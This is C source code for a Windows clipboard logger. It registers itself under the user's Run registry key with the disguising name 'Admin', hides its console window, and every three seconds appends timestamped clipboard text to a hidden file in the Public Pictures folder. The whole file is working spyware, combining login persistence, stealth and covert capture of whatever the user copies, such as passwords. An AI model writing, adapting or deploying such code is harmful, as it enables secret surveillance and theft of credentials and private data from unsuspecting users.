#include <windows.h>
#include <stdio.h>
#include <time.h>

char* path = "C:\\Users\\Public\\Pictures\\secure.txt";
FILE* fptr;

BOOL getData() {
    time_t rawTime;
    struct tm timeInfo;
    char currentTime[80];

    // Get the current time
    time(&rawTime);
    localtime_s(&timeInfo, &rawTime);

    // Format time
    strftime(currentTime, sizeof(currentTime), "%Y-%m-%d %H:%M:%S", &timeInfo);

    HANDLE clipboardData;

    // Open the clipboard
    OpenClipboard(NULL);

    // Get clipboard data
    clipboardData = GetClipboardData(CF_TEXT);

    // Open the file in append mode
    fopen_s(&fptr, path, "a+");


    // Hide the file
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);

    // Write the clipboard data with a timestamp
    fprintf(fptr, "%s: %s\n", currentTime, (char*)clipboardData);

    // Close the file
    fclose(fptr);

    // Close the clipboard
    CloseClipboard();

    return TRUE;
}

int main() {

    // Get handle to registry
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);

    const char* valueName = "Admin";
    const char* valueData = "C:\\Users\\Public\\Videos\\getClipboard.exe";

    // Enable program to run on user login
    RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, strlen(valueData) + 1);
    RegCloseKey(hKey);

    HWND windowHandle = GetConsoleWindow();

    // Hide the console window
    ShowWindow(windowHandle, SW_HIDE);

    // Infinite loop
    while (1) {
        getData();

        // Sleep for 3 seconds
        Sleep(3000);
    }

    return 0;
}
